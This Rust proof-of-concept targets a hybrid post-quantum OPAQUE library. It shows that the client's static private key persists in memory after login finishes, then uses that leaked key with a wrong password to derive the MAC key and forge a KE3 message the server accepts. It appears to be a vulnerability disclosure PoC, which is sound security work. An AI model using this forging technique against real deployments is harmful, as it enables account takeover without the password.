// Demonstrates: once client static private key is leaked from memory, password is no longer needed.
// Impact: attacker can compute KE3 directly and authenticate as the user.
//
// This PoC also shows the key remains in InitiatorState after initiator_finish().

use opaque_agent::{
    create_registration_request, finalize_registration, generate_ke1, generate_ke3, initiator_finish,
    InitiatorState, Ke1Message, Ke3Message, OpaqueInitiator, RegistrationRecord, RegistrationRequest,
};
use opaque_core::types::{
    labels, pq, pq_labels, CREDENTIAL_RESPONSE_LENGTH, HASH_LENGTH, KE1_LENGTH, MAC_LENGTH,
    MASTER_KEY_LENGTH, NONCE_LENGTH, PRIVATE_KEY_LENGTH, PUBLIC_KEY_LENGTH, REGISTRATION_RECORD_LENGTH,
};
use opaque_core::{crypto, pq_kem, protocol};
use opaque_relay::{
    build_credentials, create_registration_response, generate_ke2, responder_finish, Ke2Message,
    OpaqueResponder, RegistrationResponse, ResponderCredentials, ResponderState,
};

const ACCOUNT_ID: &[u8] = b"alice@example.com";
const REAL_PASSWORD: &[u8] = b"correct horse battery staple";
const WRONG_PASSWORD: &[u8] = b"definitely-not-the-real-password";

fn register_account(responder: &OpaqueResponder) -> Vec<u8> {
    let initiator = OpaqueInitiator::new(responder.public_key()).unwrap();
    let mut state = InitiatorState::new();
    let mut req = RegistrationRequest::new();
    create_registration_request(REAL_PASSWORD, &mut req, &mut state).unwrap();

    let mut resp = RegistrationResponse::new();
    create_registration_response(responder, &req.data, ACCOUNT_ID, &mut resp).unwrap();

    let mut record = RegistrationRecord::new();
    finalize_registration(&initiator, &resp.data, &mut state, &mut record).unwrap();

    let mut out = vec![0u8; REGISTRATION_RECORD_LENGTH];
    protocol::write_registration_record(&record.envelope, &record.initiator_public_key, &mut out).unwrap();
    out
}

fn build_ke1_bytes(ke1: &Ke1Message) -> Vec<u8> {
    let mut out = vec![0u8; KE1_LENGTH];
    protocol::write_ke1(
        &ke1.credential_request,
        &ke1.initiator_public_key,
        &ke1.initiator_nonce,
        &ke1.pq_ephemeral_public_key,
        &mut out,
    )
    .unwrap();
    out
}

fn build_mac_input(
    init_eph_pk: &[u8; PUBLIC_KEY_LENGTH],
    resp_eph_pk: &[u8; PUBLIC_KEY_LENGTH],
    init_nonce: &[u8; NONCE_LENGTH],
    resp_nonce: &[u8; NONCE_LENGTH],
    init_static_pk: &[u8; PUBLIC_KEY_LENGTH],
    resp_static_pk: &[u8; PUBLIC_KEY_LENGTH],
    credential_response: &[u8; CREDENTIAL_RESPONSE_LENGTH],
    init_kem_pk: &[u8],
    kem_ct: &[u8],
) -> Vec<u8> {
    let mac_input_size = 2 * NONCE_LENGTH
        + 4 * PUBLIC_KEY_LENGTH
        + CREDENTIAL_RESPONSE_LENGTH
        + pq::KEM_CIPHERTEXT_LENGTH
        + pq::KEM_PUBLIC_KEY_LENGTH;
    let mut mac_input = vec![0u8; mac_input_size];
    let mut off = 0usize;
    let mut append = |data: &[u8]| {
        mac_input[off..off + data.len()].copy_from_slice(data);
        off += data.len();
    };

    append(init_eph_pk);
    append(resp_eph_pk);
    append(init_nonce);
    append(resp_nonce);
    append(init_static_pk);
    append(resp_static_pk);
    append(credential_response);
    append(init_kem_pk);
    append(kem_ct);
    mac_input
}

fn main() {
    let responder = OpaqueResponder::generate().unwrap();
    let record = register_account(&responder);

    let mut creds = ResponderCredentials::new();
    build_credentials(&record, &mut creds).unwrap();

    // 1) Legitimate login once, then extract client static private key from state memory.
    let initiator = OpaqueInitiator::new(responder.public_key()).unwrap();
    let mut legit_client_state = InitiatorState::new();
    let mut legit_ke1 = Ke1Message::new();
    generate_ke1(REAL_PASSWORD, &mut legit_ke1, &mut legit_client_state).unwrap();

    let legit_ke1_bytes = build_ke1_bytes(&legit_ke1);
    let mut legit_server_state = ResponderState::new();
    let mut legit_ke2 = Ke2Message::new();
    generate_ke2(
        &responder,
        &legit_ke1_bytes,
        ACCOUNT_ID,
        &creds,
        &mut legit_ke2,
        &mut legit_server_state,
    )
    .unwrap();

    let mut legit_ke2_bytes = vec![0u8; opaque_core::types::KE2_LENGTH];
    protocol::write_ke2(
        &legit_ke2.responder_nonce,
        &legit_ke2.responder_public_key,
        &legit_ke2.credential_response,
        &legit_ke2.responder_mac,
        &legit_ke2.kem_ciphertext,
        &mut legit_ke2_bytes,
    )
    .unwrap();

    let mut legit_ke3 = Ke3Message::new();
    generate_ke3(&initiator, &legit_ke2_bytes, &mut legit_client_state, &mut legit_ke3).unwrap();

    let mut legit_ke3_bytes = vec![0u8; opaque_core::types::KE3_LENGTH];
    protocol::write_ke3(&legit_ke3.initiator_mac, &mut legit_ke3_bytes).unwrap();

    let mut legit_server_sk = Vec::new();
    let mut legit_server_mk = Vec::new();
    responder_finish(
        &legit_ke3_bytes,
        &mut legit_server_state,
        &mut legit_server_sk,
        &mut legit_server_mk,
    )
    .unwrap();

    let mut legit_client_sk = Vec::new();
    let mut legit_client_mk = Vec::new();
    initiator_finish(
        &mut legit_client_state,
        &mut legit_client_sk,
        &mut legit_client_mk,
    )
    .unwrap();

    // Key should have been scrubbed, but remains present.
    let leaked_client_static_sk = legit_client_state.initiator_private_key;
    assert_ne!(leaked_client_static_sk, [0u8; PRIVATE_KEY_LENGTH]);

    // 2) New session with wrong password, but attacker uses leaked static key to forge KE3.
    let mut attacker_state = InitiatorState::new();
    let mut attacker_ke1 = Ke1Message::new();
    generate_ke1(WRONG_PASSWORD, &mut attacker_ke1, &mut attacker_state).unwrap();
    let attacker_ke1_bytes = build_ke1_bytes(&attacker_ke1);

    let mut victim_server_state = ResponderState::new();
    let mut victim_ke2 = Ke2Message::new();
    generate_ke2(
        &responder,
        &attacker_ke1_bytes,
        ACCOUNT_ID,
        &creds,
        &mut victim_ke2,
        &mut victim_server_state,
    )
    .unwrap();

    let mut kem_ss = [0u8; pq::KEM_SHARED_SECRET_LENGTH];
    pq_kem::decapsulate(
        &attacker_state.pq_ephemeral_secret_key,
        &victim_ke2.kem_ciphertext,
        &mut kem_ss,
    )
    .unwrap();

    let mut dh1 = [0u8; PUBLIC_KEY_LENGTH];
    let mut dh2 = [0u8; PUBLIC_KEY_LENGTH];
    let mut dh3 = [0u8; PUBLIC_KEY_LENGTH];
    let mut dh4 = [0u8; PUBLIC_KEY_LENGTH];
    crypto::scalar_mult(&leaked_client_static_sk, responder.public_key(), &mut dh1).unwrap();
    crypto::scalar_mult(
        &attacker_state.initiator_ephemeral_private_key,
        responder.public_key(),
        &mut dh2,
    )
    .unwrap();
    crypto::scalar_mult(&leaked_client_static_sk, &victim_ke2.responder_public_key, &mut dh3).unwrap();
    crypto::scalar_mult(
        &attacker_state.initiator_ephemeral_private_key,
        &victim_ke2.responder_public_key,
        &mut dh4,
    )
    .unwrap();

    let leaked_client_static_pk = crypto::scalarmult_base(&leaked_client_static_sk).unwrap();
    let mac_input = build_mac_input(
        &attacker_state.initiator_ephemeral_public_key,
        &victim_ke2.responder_public_key,
        &attacker_state.initiator_nonce,
        &victim_ke2.responder_nonce,
        &leaked_client_static_pk,
        responder.public_key(),
        &victim_ke2.credential_response,
        &attacker_state.pq_ephemeral_public_key,
        &victim_ke2.kem_ciphertext,
    );

    let mut transcript_hash = [0u8; HASH_LENGTH];
    crypto::sha512_multi(&[labels::TRANSCRIPT_CONTEXT, &mac_input], &mut transcript_hash);

    let mut classical_ikm = [0u8; 4 * PUBLIC_KEY_LENGTH];
    classical_ikm[..PUBLIC_KEY_LENGTH].copy_from_slice(&dh1);
    classical_ikm[PUBLIC_KEY_LENGTH..2 * PUBLIC_KEY_LENGTH].copy_from_slice(&dh2);
    classical_ikm[2 * PUBLIC_KEY_LENGTH..3 * PUBLIC_KEY_LENGTH].copy_from_slice(&dh3);
    classical_ikm[3 * PUBLIC_KEY_LENGTH..].copy_from_slice(&dh4);

    let mut prk = [0u8; HASH_LENGTH];
    pq_kem::combine_key_material(&classical_ikm, &kem_ss, &transcript_hash, &mut prk).unwrap();

    let mut init_mac_key = [0u8; MAC_LENGTH];
    crypto::key_derivation_expand(&prk, pq_labels::PQ_INITIATOR_MAC_INFO, &mut init_mac_key).unwrap();

    let mut forged_ke3_mac = [0u8; MAC_LENGTH];
    crypto::hmac_sha512(&init_mac_key, &mac_input, &mut forged_ke3_mac).unwrap();

    let mut server_session_key = Vec::new();
    let mut server_master_key = Vec::new();
    responder_finish(
        &forged_ke3_mac,
        &mut victim_server_state,
        &mut server_session_key,
        &mut server_master_key,
    )
    .unwrap();

    assert_eq!(server_master_key.len(), MASTER_KEY_LENGTH);
    println!("Password bypass succeeded using leaked client static private key.");
}

